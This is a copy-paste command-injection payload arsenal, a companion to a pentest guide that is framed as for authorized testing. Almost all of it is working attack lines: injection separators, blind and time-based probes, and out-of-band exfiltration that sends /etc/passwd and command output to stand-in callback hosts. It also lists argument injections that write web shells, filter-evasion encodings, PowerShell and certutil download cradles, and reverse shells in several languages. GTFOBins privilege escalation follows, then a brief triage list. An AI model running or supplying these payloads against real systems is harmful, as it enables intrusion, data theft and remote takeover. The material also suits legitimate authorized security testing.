# Command-Injection Arsenal — Separators, Blind/OOB, Evasion & Reverse Shells (copy-paste)

> Companion to `COMMAND_INJECTION_TESTING_GUIDE.md`. Authorized testing only — **benign markers**, no persistence,
> clean up (Guide §19). The finding is **a command executing** (output / repeated delay / server-sourced OOB).

---

## 1. In-band detection (separators) — Guide §5/§6

```
;id            | id            || id           & id          && id
127.0.0.1;id   127.0.0.1| id   127.0.0.1&&id    127.0.0.1||id
`id`           $(id)          %0aid            %0a id        \nid
"; id; "       '; id; '       ); id; (          |id|
Windows:  & whoami    | whoami    && whoami    || whoami    %0a whoami
Deterministic markers:  echo CMDI-7f3a9   $(echo 49)   `expr 7 \* 7`   id   whoami   hostname
```

## 1b. Context-aware breakout (quotes / parens / escaping) — Guide §6.1
```
# probe the context first: send  127.0.0.1'  and  127.0.0.1"  separately — whichever errors = the quote you're in.
unquoted:        127.0.0.1; id            127.0.0.1| id            127.0.0.1 `id`
double-quoted:   127.0.0.1"; id; "        127.0.0.1"; id #          127.0.0.1" && id && echo "
single-quoted:   127.0.0.1'; id; '        127.0.0.1'$(id)'         (no $()/`` work INSIDE single quotes — must close)
inside backtick: ` ; id ; `               inside $( ): ) ; id ; echo $(
escaped quotes:  %0a id                   $IFS$9 id                (newline ignores quoting; or pivot to arg injection §4)
second-order:    store the payload in a name/host/path field → it fires when a backend job/cron consumes it (blind, watch OOB).
```

## 2. Time-based blind — Guide §7

```
;sleep 10            `sleep 10`        $(sleep 10)        || sleep 10        & sleep 10
;ping -c 10 127.0.0.1       127.0.0.1;ping -c 10 127.0.0.1
Windows:  & ping -n 10 127.0.0.1     & timeout /t 10
Boolean-via-time (exfil 1 char):  ;if [ $(whoami|cut -c1) = r ]; then sleep 8; fi
Re-test 2-3x vs a no-payload baseline to exclude jitter.
```

## 2b. Boolean / response-difference blind — no sleep, no OOB (Guide §7.1)
```
# when timing is noisy AND OOB egress is blocked: find a response diff between success vs failure, then read 1 char/req.
;true            vs   ;false                  → body/status/length differs → separator executes
`id`             vs   `idXXXX`                → invalid command emits an error string only on the bad one
127.0.0.1$(echo) vs   127.0.0.1$(echoXXXX)    → command-substitution success changes echoed value
;[ -f /etc/passwd ] && echo CMDI_OK           → look for the CMDI_OK marker / changed output
# DATA via boolean oracle (no timing):
;[ $(id -u) -eq 0 ] && <observable true-branch>                    → are we root?
;[ "$(whoami|cut -c1)" = "r" ] && <observable true-branch>         → char-by-char exfil
```

## 3. Out-of-band (OOB) detection + exfil — Guide §8/§12

```
# confirm (DNS escapes most egress filters)
;nslookup CMDI.YOURID.oast.pro          ;dig CMDI.YOURID.oast.pro          ;host CMDI.YOURID.oast.pro
;curl http://YOURID.oast.pro/CMDI        ;wget -q -O- http://YOURID.oast.pro/CMDI
Windows:  & nslookup CMDI.YOURID.oast.pro     & powershell -c "Resolve-DnsName CMDI.YOURID.oast.pro"

# EXFIL command output through the callback
;nslookup $(whoami).YOURID.oast.pro
;nslookup $(hostname).YOURID.oast.pro
;curl http://YOURID.oast.pro/$(id|base64)
;curl -s --data-binary @/etc/passwd http://YOURID.oast.pro/p
# chunk for DNS label limits:
;for c in $(cat /etc/passwd|base64|tr -d '='|fold -w60); do nslookup $c.YOURID.oast.pro; done
```

## 4. Argument / option injection — Guide §9

```
curl:   -o /var/www/html/shell.php http://YOUR_IP/shell.php     # file write -> RCE
        --upload-file /etc/passwd http://YOUR_IP/                # exfil
        -K http://YOUR_IP/curlrc                                 # remote config
tar:    --checkpoint=1 --checkpoint-action=exec=sh\ shell.sh     # run a command
        -I /bin/sh -c id                                         # compress-program injection
git:    ext::sh -c 'id'        --upload-pack='id'                # protocol/arg injection
wget:   --output-document=/path   -O /path   --post-file=/etc/passwd http://YOUR_IP/
zip:    --unzip-command 'sh -c id'     -TT 'sh -c id'
rsync:  -e 'sh -c id'    --rsh='sh -c id'
find:   -exec id ;       sed: s/x/y/e (GNU)        awk 'BEGIN{system("id")}'
ffmpeg: -i "concat:/etc/passwd"   (read)   crafted .m3u8 (SSRF/read)
```

## 5. WAF / blacklist evasion — Guide §10

```
SPACES:    cat${IFS}/etc/passwd   cat$IFS$9/etc/passwd   {cat,/etc/passwd}   cat</etc/passwd   X=$'\t';cat${X}/etc/passwd
KEYWORDS:  c''at /etc/passwd   c\at /etc/passwd   "c"at /etc/passwd   ca''t   w'h'o'a'm'i   who$@ami   w\ho\am\i
GLOBBING:  /???/c?t /etc/passwd   /bin/c?t /e??/p??sw?   /???/?????32 (win)
SLASH:     ${HOME:0:1}   ${PATH:0:1}   $(echo .|tr . /)
ENCODE:    echo d2hvYW1p|base64 -d|bash    printf '\167\150\157\141\155\151'|sh    $(printf whoami)
           echo -e '\x77\x68\x6f\x61\x6d\x69'|sh    bash<<<$(base64 -d<<<d2hvYW1p)
SEP-SWAP:  if ; blocked → | , || , && , %0a , `cmd` , $(cmd) , $IFS
CASE/VAR:  $(tr A-Z a-z<<<WHOAMI)   ${IFS%??}
Combine:   {cat,/e?c/p?sswd}    c\at${IFS}/etc/pass\wd
```
```bash
python3 poc/evasion.py --cmd "cat /etc/passwd" --block "space,cat"
```

## 5b. Windows command injection — deep (cmd.exe + PowerShell + cradles + DOSfuscation) — Guide §14.1
```
# detect Windows:  & ver      & echo %OS%      ; $PSVersionTable     (Linux ;sleep silent ≠ safe)
SEPARATORS:   127.0.0.1 & whoami     127.0.0.1 | whoami     127.0.0.1 || whoami     (|| = great blind on a bad host)
ESCAPE/SPLIT: w^h^o^a^m^i      who""ami      "wh"o"am"i      whoami%09  (tab)
ENV SUBSTRING (rebuild a blocked word):  %COMSPEC:~-7,3%       set s=who&&set t=ami&&cmd /v:on /c "echo !s!!t!"
FOR /F (DOSfuscation):  for /f %i in ('whoami') do @echo %i
BENIGN PROOF: & echo CMDI-7f3a9     & whoami     & hostname     & ver
OOB / EXFIL:  & nslookup %COMPUTERNAME%.YOUR.oast.fun     & powershell Resolve-DnsName $env:USERNAME.YOUR.oast.fun
              & curl http://YOUR.oast.fun/proof            (curl ships in modern Win10/11)

# PowerShell one-liners:
; powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/s.ps1')"
; powershell -enc <base64-UTF16LE>          # bypasses quote/space filters; encode:  [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
; powershell IWR http://YOUR_IP/s.ps1 -OutFile s.ps1; .\s.ps1

# download cradles (cmd) → fetch & run your payload (authorized; bug-bounty: a marker is enough):
certutil -urlcache -split -f http://YOUR_IP/s.exe %TEMP%\s.exe & %TEMP%\s.exe
bitsadmin /transfer j http://YOUR_IP/s.exe %TEMP%\s.exe & %TEMP%\s.exe
curl http://YOUR_IP/s.exe -o %TEMP%\s.exe & %TEMP%\s.exe
# notes: cmd comments are :: / rem (NOT #) ; %VAR% expands at parse time ; ^ is the escape char.
```

## 6. Reverse shells (authorized engagements only — Guide §11)

```
bash:     bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
bash2:    0<&196;exec 196<>/dev/tcp/YOUR_IP/4444; sh <&196 >&196 2>&196
nc:       nc YOUR_IP 4444 -e /bin/sh        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f
python:   python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
php:      php -r '$s=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
perl:     perl -e 'use Socket;$i="YOUR_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));...'
powershell (Windows):
  powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('YOUR_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}"
```
```bash
python3 poc/revshell.py --lhost YOUR_IP --lport 4444 --type bash --urlencode
# catch it:  nc -lvnp 4444
```

## 7. Special sinks — Guide §14

```
ImageMagick (MVG/SVG delegate RCE):  push graphic-context; image over 0,0 0,0 'https://x"|id ">'; pop graphic-context
ffmpeg read/SSRF:  a .m3u8 referencing file:///etc/passwd or http://169.254.169.254/...
Ghostscript:  -dSAFER bypass via crafted .eps/.pdf  ( (%pipe%id) ... )
git RCE:  clone ext::sh -c 'id'   /  a repo with a malicious hook (post-checkout)
```

## 7b. Language / framework sinks & GTFOBins escalation (guide §2/§13)
```
# the sink that put you here (grep source / errors reveal the language):
PHP:    system() exec() shell_exec() passthru() popen() proc_open() `backticks`  (also: mail() -X, escapeshellcmd gaps)
Python: os.system() subprocess.*(shell=True) os.popen() commands.* eval()/pickle (deserial → RCE)
Node:   child_process.exec()/execSync() (shell) ; spawn/execFile w/ shell:true ; template/vm escapes
Java:   Runtime.exec() ProcessBuilder ; +Groovy/SpEL eval ; ScriptEngine
Ruby:   system() exec() %x[] `backticks` Open3 Kernel.open("|cmd") ; eval/ERB
.NET:   Process.Start ; System.Diagnostics ; cmd.exe /c
Perl:   open(F,"cmd|") ; system() ; backticks ; `qx`
# once you have exec, escalate via GTFOBins (a "limited" binary → full shell/file read/SUID):
#   awk 'BEGIN{system("/bin/sh")}'  · find . -exec /bin/sh \;  · vi -c ':!sh'  · tar cf /dev/null x --checkpoint-action=exec=sh
#   env /bin/sh · perl -e 'exec "/bin/sh"' · python -c 'import os;os.system("/bin/sh")'  · less→!sh · git -p help→!sh
# capability/SUID/sudo abuse for priv-esc: sudo -l ; getcap -r / ; find / -perm -4000  → match on gtfobins.github.io
```

## 7c. Argument-injection deep set (when separators are filtered) (guide §9)
```
# the value lands as ONE argv item to a known tool → inject its dangerous flags:
git:    git clone "ext::sh -c id" x        --upload-pack='`id`'      -c core.sshCommand='id' ...
        a repo hook (post-checkout/pre-commit) running on clone/checkout → RCE
tar:    --checkpoint=1 --checkpoint-action=exec=sh\ -c\ id     --use-compress-program='sh -c id'    --to-command=...
curl:   -o /var/www/html/sh.php http://YOUR/sh.php   -K http://YOUR/rc   --config -   --upload-file /etc/passwd http://YOUR/
wget:   --use-askpass=/bot.sh   -O /path   --post-file=/etc/shadow http://YOUR/
zip:    -T --unzip-command 'sh -c "id"'   ;  7z/unrar listing tricks
rsync:  -e 'sh -c id'   --rsh='sh -c id'   ;  scp/ssh ProxyCommand
ssh:    -o ProxyCommand='sh -c id'  -o PermitLocalCommand=yes -o LocalCommand='id'
find/sed/awk/mysql/psql: -exec/-e/--exec/\!sh/--ssl-... → command exec where reachable
python/php/node "-c"/"-e" reachable → direct code exec
```

## 8b. Real-world command-injection CVEs & chains (guide §14/§17)
```
□ Shellshock (CVE-2014-6271) — env var → bash function trailer → RCE via CGI (User-Agent/Cookie). Still found on legacy.
□ ImageMagick ImageTragick (CVE-2016-3714) — delegate shell-out on image processing (cross-ref FileUpload kit §P).
□ Ghostscript -dSAFER bypass (CVE-2018-16509 / CVE-2023-36664 %pipe%) — PDF/EPS render → RCE.
□ Confluence OGNL / Atlassian, Spring Cloud / Apache OFBiz, GoCD, GitLab "ExifTool" (CVE-2021-22205) → RCE.
□ Citrix/SonicWall/F5 BIG-IP/Pulse appliance "diagnostic"/"ping" endpoints → unauth command injection (recurring).
□ IoT/router web UIs (ping/traceroute/DDNS fields) — the classic embedded cmdi surface.
□ "import"/"backup"/"export"/"convert"/"git clone" admin features → argument injection → RCE (§7c).
□ Log4Shell (CVE-2021-44228) is JNDI-injection, not OS-cmdi, but a logged param → RCE — test it on the same inputs.
```
> **References:** PortSwigger *OS command injection*, OWASP Command Injection, PayloadsAllTheThings *Command Injection*
> + *Argument Injection*, HackTricks *Command Injection*, GTFOBins (gtfobins.github.io), `commixproject/commix`,
> Hackviser & PentesterLab command-injection modules.

---

## 8. Triage rules (don't waste a report)

```
id/whoami OUTPUT returned                         → REPORT in-band RCE = Critical
;sleep 10 reliably delays (repeated vs baseline)  → REPORT blind RCE = Critical (add OOB/exfil)
OOB DNS/HTTP hit from SERVER IP carrying $(whoami) → REPORT blind RCE = Critical
argument injection → file write/RCE               → REPORT Critical ;  → SSRF/read only → High
reflected ; / | with NO execution                 → NOT a finding
single jittery slow response                       → NOT proof (re-test)
commix flagged, no manual proof                    → reproduce first
```
